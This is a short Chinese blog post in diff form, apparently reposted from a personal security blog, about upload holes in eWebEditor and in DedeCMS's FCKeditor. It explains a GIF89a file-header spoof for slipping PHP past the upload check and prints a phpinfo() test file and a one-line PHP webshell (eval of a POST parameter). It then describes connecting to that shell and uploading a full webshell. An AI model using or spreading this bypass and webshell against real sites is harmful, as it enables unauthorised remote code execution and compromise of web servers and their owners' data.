@@ -1,0 +1,27 @@
+
+关于eWebEditor 漏洞php版本的和asp的一样。有目录浏览。和编辑扩展名。重点在于虽然支持了php格式但上传还是上传不了。不过利用织梦的gif89a漏洞倒可以实现php一句话上传，然后再上传webshell。
+
+备注：织梦的gif89a漏洞，准确来说应该是DEDECMS中所用的php版的FCKeditor存在上传漏洞，gif89a文件头欺骗。DEDECMS中在上传拖上没有对picSubmit进行任何处理。但是却不能直接上传php马。因为会识别。使用修改过的php小马。
+
+gif89a
+
+<?php
+
+phpinfo();
+
+?>
+
+RFI
+
+gif89a
+
+<?php
+
+eval($_POST[c]);
+
+?>
+
+利用gif89a进行了欺骗。现在上传就可以成功了.然后有php一句话客户端连接.
+本文来源于独自等待博客：http://www.waitalone.cn/ 原文地址：http://www.waitalone.cn/post/253.html 
+
+
